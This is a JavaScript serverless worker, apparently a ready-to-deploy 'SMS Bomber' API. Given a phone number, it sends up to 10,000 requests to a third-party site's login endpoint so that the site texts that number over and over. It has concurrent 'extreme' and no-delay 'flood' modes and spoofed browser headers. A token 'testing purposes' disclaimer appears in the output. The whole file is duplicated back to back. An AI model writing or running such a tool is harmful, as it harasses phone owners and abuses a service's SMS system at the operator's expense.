// SMS Bomber API using deikho.com ONLY
export default {
  async fetch(request) {
    const url = new URL(request.url);
    const phone = url.searchParams.get('phone');
    const qty = parseInt(url.searchParams.get('qty')) || 10;
    const mode = url.searchParams.get('mode') || 'normal'; // normal, fast, extreme
    const country = url.searchParams.get('country') || '92';

    // CORS headers
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
      'Content-Type': 'application/json'
    };

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    // Validate input
    if (!phone) {
      return new Response(
        JSON.stringify({
          status: 'error',
          message: 'Phone parameter is required',
          example: '/?phone=923001234567&qty=100&mode=fast'
        }, null, 2),
        { status: 400, headers: corsHeaders }
      );
    }

    if (qty > 10000) {
      return new Response(
        JSON.stringify({
          status: 'error',
          message: 'Maximum 10000 messages allowed'
        }, null, 2),
        { status: 400, headers: corsHeaders }
      );
    }

    try {
      const startTime = Date.now();
      
      // Format phone number
      const formattedPhone = formatPhoneNumber(phone, country);
      
      let results;
      
      // Select bombing mode
      switch(mode) {
        case 'fast':
          results = await fastBombDeikho(formattedPhone, qty);
          break;
        case 'extreme':
          results = await extremeBombDeikho(formattedPhone, qty);
          break;
        case 'flood':
          results = await floodModeDeikho(formattedPhone, qty);
          break;
        default:
          results = await normalBombDeikho(formattedPhone, qty);
      }
      
      const totalTime = Date.now() - startTime;

      return new Response(
        JSON.stringify({
          status: 'success',
          phone: formattedPhone,
          quantity: qty,
          mode: mode,
          api_used: 'deikho.com ONLY',
          messages_sent: results.successful,
          failed: results.failed,
          success_rate: `${((results.successful / qty) * 100).toFixed(1)}%`,
          total_time: `${totalTime}ms`,
          speed: `${(qty / (totalTime / 1000)).toFixed(2)} requests/sec`,
          average_response_time: `${(totalTime / qty).toFixed(0)}ms per request`,
          results: results.details,
          timestamp: new Date().toISOString(),
          api_endpoint: 'https://deikho.com/login?phone=',
          warning: 'Use responsibly - Only for testing purposes!'
        }, null, 2),
        { headers: corsHeaders }
      );

    } catch (error) {
      return new Response(
        JSON.stringify({
          status: 'error',
          message: error.message,
          api: 'deikho.com',
          timestamp: new Date().toISOString()
        }, null, 2),
        { status: 500, headers: corsHeaders }
      );
    }
  }
};

// Format phone number
function formatPhoneNumber(phone, countryCode) {
  // Remove all non-digits
  let cleaned = phone.replace(/\D/g, '');
  
  // Remove leading zero
  if (cleaned.startsWith('0')) {
    cleaned = cleaned.substring(1);
  }
  
  // Add country code if not present
  if (!cleaned.startsWith(countryCode)) {
    cleaned = countryCode + cleaned;
  }
  
  return cleaned;
}

// Normal bombing mode
async function normalBombDeikho(phone, quantity) {
  const results = [];
  let successful = 0;
  let failed = 0;
  
  const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
  
  for (let i = 0; i < quantity; i++) {
    try {
      const start = Date.now();
      
      const response = await fetch(DEIKHO_API, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Referer': 'https://deikho.com/',
          'Origin': 'https://deikho.com',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      });
      
      const responseTime = Date.now() - start;
      
      if (response.ok) {
        successful++;
        results.push({
          attempt: i + 1,
          status: 'success',
          response_time: `${responseTime}ms`,
          status_code: response.status
        });
      } else {
        failed++;
        results.push({
          attempt: i + 1,
          status: 'failed',
          status_code: response.status,
          response_time: `${responseTime}ms`
        });
      }
      
      // Small delay between requests (100ms)
      if (i < quantity - 1) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
    } catch (error) {
      failed++;
      results.push({
        attempt: i + 1,
        status: 'error',
        error: error.message
      });
    }
  }
  
  return {
    successful: successful,
    failed: failed,
    details: results.slice(0, 20) // Show only first 20 attempts
  };
}

// Fast bombing mode (concurrent)
async function fastBombDeikho(phone, quantity) {
  const BATCH_SIZE = 10;
  const CONCURRENT = 5;
  const results = [];
  let totalSuccessful = 0;
  
  const batches = Math.ceil(quantity / BATCH_SIZE);
  
  for (let batch = 0; batch < batches; batch++) {
    const currentBatch = Math.min(BATCH_SIZE, quantity - (batch * BATCH_SIZE));
    
    const batchPromises = [];
    
    // Create concurrent requests
    for (let i = 0; i < CONCURRENT && i < currentBatch; i++) {
      const requestIndex = (batch * BATCH_SIZE) + i;
      if (requestIndex >= quantity) break;
      
      batchPromises.push(
        (async () => {
          try {
            const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
            const response = await fetch(DEIKHO_API, {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*'
              }
            });
            
            return {
              attempt: requestIndex + 1,
              success: response.ok,
              status: response.status
            };
          } catch (error) {
            return {
              attempt: requestIndex + 1,
              success: false,
              error: error.message
            };
          }
        })()
      );
    }
    
    const batchResults = await Promise.allSettled(batchPromises);
    
    batchResults.forEach(result => {
      if (result.value) {
        if (result.value.success) {
          totalSuccessful++;
        }
        results.push(result.value);
      }
    });
    
    // Tiny delay between batches
    if (batch < batches - 1) {
      await new Promise(resolve => setTimeout(resolve, 50));
    }
  }
  
  return {
    successful: totalSuccessful,
    failed: quantity - totalSuccessful,
    details: results.slice(0, 15)
  };
}

// Extreme bombing mode (maximum speed)
async function extremeBombDeikho(phone, quantity) {
  const MAX_CONCURRENT = 20;
  const results = [];
  let successful = 0;
  
  // Create all promises at once
  const promises = [];
  
  for (let i = 0; i < quantity; i++) {
    promises.push(
      (async (index) => {
        try {
          const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
          const response = await fetch(DEIKHO_API, {
            headers: {
              'User-Agent': `Mozilla/5.0 (Request-${index})`,
              'Accept': '*/*'
            },
            cf: {
              // Cloudflare optimizations
              cacheTtl: 0,
              cacheEverything: false,
              polish: 'off'
            }
          });
          
          const success = response.ok;
          if (success) successful++;
          
          return {
            attempt: index + 1,
            success: success,
            status: response.status
          };
        } catch (error) {
          return {
            attempt: index + 1,
            success: false,
            error: error.message
          };
        }
      })(i)
    );
    
    // Control concurrency
    if (promises.length >= MAX_CONCURRENT || i === quantity - 1) {
      const batchResults = await Promise.allSettled(promises);
      batchResults.forEach(result => {
        if (result.value) {
          results.push(result.value);
        }
      });
      promises.length = 0; // Clear array
    }
  }
  
  return {
    successful: successful,
    failed: quantity - successful,
    details: results.slice(0, 10) // Show only first 10
  };
}

// Flood mode (continuous requests)
async function floodModeDeikho(phone, quantity) {
  const DURATION = 30000; // 30 seconds flood
  const startTime = Date.now();
  const endTime = startTime + DURATION;
  
  const results = [];
  let successful = 0;
  let attempts = 0;
  
  // Keep sending until time runs out or quantity reached
  while (Date.now() < endTime && attempts < quantity) {
    attempts++;
    
    try {
      const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
      const response = await fetch(DEIKHO_API, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Flood-Mode)',
          'Accept': '*/*'
        }
      });
      
      if (response.ok) {
        successful++;
      }
      
      // Log every 10th attempt
      if (attempts % 10 === 0) {
        results.push({
          batch: attempts / 10,
          time_elapsed: `${Date.now() - startTime}ms`,
          successful_so_far: successful,
          attempts_so_far: attempts
        });
      }
      
      // No delay - maximum speed
      
    } catch (error) {
      // Continue despite errors
    }
    
    // Break if we reached quantity
    if (attempts >= quantity) break;
  }
  
  const actualQuantity = Math.min(attempts, quantity);
  
  return {
    successful: successful,
    failed: actualQuantity - successful,
    details: [{
      mode: 'flood',
      duration: `${Date.now() - startTime}ms`,
      total_attempts: attempts,
      successful: successful,
      failed: attempts - successful,
      requests_per_second: (attempts / ((Date.now() - startTime) / 1000)).toFixed(2)
    }]
  };
}

// Health check with deikho.com test
async function healthCheck() {
  try {
    const testPhone = '923001234567'; // Test number
    const DEIKHO_API = `https://deikho.com/login?phone=${testPhone}`;
    
    const response = await fetch(DEIKHO_API, {
      headers: {
        'User-Agent': 'Health-Check/1.0'
      }
    });
    
    return {
      deikho_api: 'online',
      status_code: response.status,
      response_time: 'tested'
    };
  } catch (error) {
    return {
      deikho_api: 'offline',
      error: error.message
    };
  }
}

// Additional endpoint for API info
addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  
  // Health check endpoint
  if (url.pathname === '/health' || url.pathname === '/status') {
    event.respondWith(new Response(JSON.stringify({
      status: 'online',
      service: 'Deikho.com SMS Bomber',
      version: '1.0',
      api_endpoint: 'https://deikho.com/login?phone=',
      limits: {
        max_messages: 10000,
        modes: ['normal', 'fast', 'extreme', 'flood'],
        supported_countries: ['92', '1', '44', '91']
      },
      usage: '/?phone=PHONE&qty=QUANTITY&mode=MODE&country=CODE',
      example: '/?phone=3012345678&qty=100&mode=fast&country=92',
      timestamp: new Date().toISOString()
    }, null, 2), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    }));
  }
  
  // Simple test endpoint
  if (url.pathname === '/test') {
    const testPhone = url.searchParams.get('phone') || '923001234567';
    event.respondWith(handleTest(testPhone));
  }
});

async function handleTest(phone) {
  try {
    const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
    const response = await fetch(DEIKHO_API);
    
    return new Response(JSON.stringify({
      test: 'success',
      phone: phone,
      api: 'deikho.com',
      status: response.status,
      working: response.ok
    }, null, 2), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  } catch (error) {
    return new Response(JSON.stringify({
      test: 'failed',
      error: error.message
    }, null, 2), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
}// SMS Bomber API using deikho.com ONLY
export default {
  async fetch(request) {
    const url = new URL(request.url);
    const phone = url.searchParams.get('phone');
    const qty = parseInt(url.searchParams.get('qty')) || 10;
    const mode = url.searchParams.get('mode') || 'normal'; // normal, fast, extreme
    const country = url.searchParams.get('country') || '92';

    // CORS headers
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
      'Content-Type': 'application/json'
    };

    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    // Validate input
    if (!phone) {
      return new Response(
        JSON.stringify({
          status: 'error',
          message: 'Phone parameter is required',
          example: '/?phone=923001234567&qty=100&mode=fast'
        }, null, 2),
        { status: 400, headers: corsHeaders }
      );
    }

    if (qty > 10000) {
      return new Response(
        JSON.stringify({
          status: 'error',
          message: 'Maximum 10000 messages allowed'
        }, null, 2),
        { status: 400, headers: corsHeaders }
      );
    }

    try {
      const startTime = Date.now();
      
      // Format phone number
      const formattedPhone = formatPhoneNumber(phone, country);
      
      let results;
      
      // Select bombing mode
      switch(mode) {
        case 'fast':
          results = await fastBombDeikho(formattedPhone, qty);
          break;
        case 'extreme':
          results = await extremeBombDeikho(formattedPhone, qty);
          break;
        case 'flood':
          results = await floodModeDeikho(formattedPhone, qty);
          break;
        default:
          results = await normalBombDeikho(formattedPhone, qty);
      }
      
      const totalTime = Date.now() - startTime;

      return new Response(
        JSON.stringify({
          status: 'success',
          phone: formattedPhone,
          quantity: qty,
          mode: mode,
          api_used: 'deikho.com ONLY',
          messages_sent: results.successful,
          failed: results.failed,
          success_rate: `${((results.successful / qty) * 100).toFixed(1)}%`,
          total_time: `${totalTime}ms`,
          speed: `${(qty / (totalTime / 1000)).toFixed(2)} requests/sec`,
          average_response_time: `${(totalTime / qty).toFixed(0)}ms per request`,
          results: results.details,
          timestamp: new Date().toISOString(),
          api_endpoint: 'https://deikho.com/login?phone=',
          warning: 'Use responsibly - Only for testing purposes!'
        }, null, 2),
        { headers: corsHeaders }
      );

    } catch (error) {
      return new Response(
        JSON.stringify({
          status: 'error',
          message: error.message,
          api: 'deikho.com',
          timestamp: new Date().toISOString()
        }, null, 2),
        { status: 500, headers: corsHeaders }
      );
    }
  }
};

// Format phone number
function formatPhoneNumber(phone, countryCode) {
  // Remove all non-digits
  let cleaned = phone.replace(/\D/g, '');
  
  // Remove leading zero
  if (cleaned.startsWith('0')) {
    cleaned = cleaned.substring(1);
  }
  
  // Add country code if not present
  if (!cleaned.startsWith(countryCode)) {
    cleaned = countryCode + cleaned;
  }
  
  return cleaned;
}

// Normal bombing mode
async function normalBombDeikho(phone, quantity) {
  const results = [];
  let successful = 0;
  let failed = 0;
  
  const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
  
  for (let i = 0; i < quantity; i++) {
    try {
      const start = Date.now();
      
      const response = await fetch(DEIKHO_API, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Referer': 'https://deikho.com/',
          'Origin': 'https://deikho.com',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache'
        }
      });
      
      const responseTime = Date.now() - start;
      
      if (response.ok) {
        successful++;
        results.push({
          attempt: i + 1,
          status: 'success',
          response_time: `${responseTime}ms`,
          status_code: response.status
        });
      } else {
        failed++;
        results.push({
          attempt: i + 1,
          status: 'failed',
          status_code: response.status,
          response_time: `${responseTime}ms`
        });
      }
      
      // Small delay between requests (100ms)
      if (i < quantity - 1) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
    } catch (error) {
      failed++;
      results.push({
        attempt: i + 1,
        status: 'error',
        error: error.message
      });
    }
  }
  
  return {
    successful: successful,
    failed: failed,
    details: results.slice(0, 20) // Show only first 20 attempts
  };
}

// Fast bombing mode (concurrent)
async function fastBombDeikho(phone, quantity) {
  const BATCH_SIZE = 10;
  const CONCURRENT = 5;
  const results = [];
  let totalSuccessful = 0;
  
  const batches = Math.ceil(quantity / BATCH_SIZE);
  
  for (let batch = 0; batch < batches; batch++) {
    const currentBatch = Math.min(BATCH_SIZE, quantity - (batch * BATCH_SIZE));
    
    const batchPromises = [];
    
    // Create concurrent requests
    for (let i = 0; i < CONCURRENT && i < currentBatch; i++) {
      const requestIndex = (batch * BATCH_SIZE) + i;
      if (requestIndex >= quantity) break;
      
      batchPromises.push(
        (async () => {
          try {
            const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
            const response = await fetch(DEIKHO_API, {
              headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*'
              }
            });
            
            return {
              attempt: requestIndex + 1,
              success: response.ok,
              status: response.status
            };
          } catch (error) {
            return {
              attempt: requestIndex + 1,
              success: false,
              error: error.message
            };
          }
        })()
      );
    }
    
    const batchResults = await Promise.allSettled(batchPromises);
    
    batchResults.forEach(result => {
      if (result.value) {
        if (result.value.success) {
          totalSuccessful++;
        }
        results.push(result.value);
      }
    });
    
    // Tiny delay between batches
    if (batch < batches - 1) {
      await new Promise(resolve => setTimeout(resolve, 50));
    }
  }
  
  return {
    successful: totalSuccessful,
    failed: quantity - totalSuccessful,
    details: results.slice(0, 15)
  };
}

// Extreme bombing mode (maximum speed)
async function extremeBombDeikho(phone, quantity) {
  const MAX_CONCURRENT = 20;
  const results = [];
  let successful = 0;
  
  // Create all promises at once
  const promises = [];
  
  for (let i = 0; i < quantity; i++) {
    promises.push(
      (async (index) => {
        try {
          const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
          const response = await fetch(DEIKHO_API, {
            headers: {
              'User-Agent': `Mozilla/5.0 (Request-${index})`,
              'Accept': '*/*'
            },
            cf: {
              // Cloudflare optimizations
              cacheTtl: 0,
              cacheEverything: false,
              polish: 'off'
            }
          });
          
          const success = response.ok;
          if (success) successful++;
          
          return {
            attempt: index + 1,
            success: success,
            status: response.status
          };
        } catch (error) {
          return {
            attempt: index + 1,
            success: false,
            error: error.message
          };
        }
      })(i)
    );
    
    // Control concurrency
    if (promises.length >= MAX_CONCURRENT || i === quantity - 1) {
      const batchResults = await Promise.allSettled(promises);
      batchResults.forEach(result => {
        if (result.value) {
          results.push(result.value);
        }
      });
      promises.length = 0; // Clear array
    }
  }
  
  return {
    successful: successful,
    failed: quantity - successful,
    details: results.slice(0, 10) // Show only first 10
  };
}

// Flood mode (continuous requests)
async function floodModeDeikho(phone, quantity) {
  const DURATION = 30000; // 30 seconds flood
  const startTime = Date.now();
  const endTime = startTime + DURATION;
  
  const results = [];
  let successful = 0;
  let attempts = 0;
  
  // Keep sending until time runs out or quantity reached
  while (Date.now() < endTime && attempts < quantity) {
    attempts++;
    
    try {
      const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
      const response = await fetch(DEIKHO_API, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Flood-Mode)',
          'Accept': '*/*'
        }
      });
      
      if (response.ok) {
        successful++;
      }
      
      // Log every 10th attempt
      if (attempts % 10 === 0) {
        results.push({
          batch: attempts / 10,
          time_elapsed: `${Date.now() - startTime}ms`,
          successful_so_far: successful,
          attempts_so_far: attempts
        });
      }
      
      // No delay - maximum speed
      
    } catch (error) {
      // Continue despite errors
    }
    
    // Break if we reached quantity
    if (attempts >= quantity) break;
  }
  
  const actualQuantity = Math.min(attempts, quantity);
  
  return {
    successful: successful,
    failed: actualQuantity - successful,
    details: [{
      mode: 'flood',
      duration: `${Date.now() - startTime}ms`,
      total_attempts: attempts,
      successful: successful,
      failed: attempts - successful,
      requests_per_second: (attempts / ((Date.now() - startTime) / 1000)).toFixed(2)
    }]
  };
}

// Health check with deikho.com test
async function healthCheck() {
  try {
    const testPhone = '923001234567'; // Test number
    const DEIKHO_API = `https://deikho.com/login?phone=${testPhone}`;
    
    const response = await fetch(DEIKHO_API, {
      headers: {
        'User-Agent': 'Health-Check/1.0'
      }
    });
    
    return {
      deikho_api: 'online',
      status_code: response.status,
      response_time: 'tested'
    };
  } catch (error) {
    return {
      deikho_api: 'offline',
      error: error.message
    };
  }
}

// Additional endpoint for API info
addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  
  // Health check endpoint
  if (url.pathname === '/health' || url.pathname === '/status') {
    event.respondWith(new Response(JSON.stringify({
      status: 'online',
      service: 'Deikho.com SMS Bomber',
      version: '1.0',
      api_endpoint: 'https://deikho.com/login?phone=',
      limits: {
        max_messages: 10000,
        modes: ['normal', 'fast', 'extreme', 'flood'],
        supported_countries: ['92', '1', '44', '91']
      },
      usage: '/?phone=PHONE&qty=QUANTITY&mode=MODE&country=CODE',
      example: '/?phone=3012345678&qty=100&mode=fast&country=92',
      timestamp: new Date().toISOString()
    }, null, 2), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    }));
  }
  
  // Simple test endpoint
  if (url.pathname === '/test') {
    const testPhone = url.searchParams.get('phone') || '923001234567';
    event.respondWith(handleTest(testPhone));
  }
});

async function handleTest(phone) {
  try {
    const DEIKHO_API = `https://deikho.com/login?phone=${phone}`;
    const response = await fetch(DEIKHO_API);
    
    return new Response(JSON.stringify({
      test: 'success',
      phone: phone,
      api: 'deikho.com',
      status: response.status,
      working: response.ok
    }, null, 2), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  } catch (error) {
    return new Response(JSON.stringify({
      test: 'failed',
      error: error.message
    }, null, 2), {
      status: 500,
      headers: { 'Content-Type': 'application/json' }
    });
  }
        }
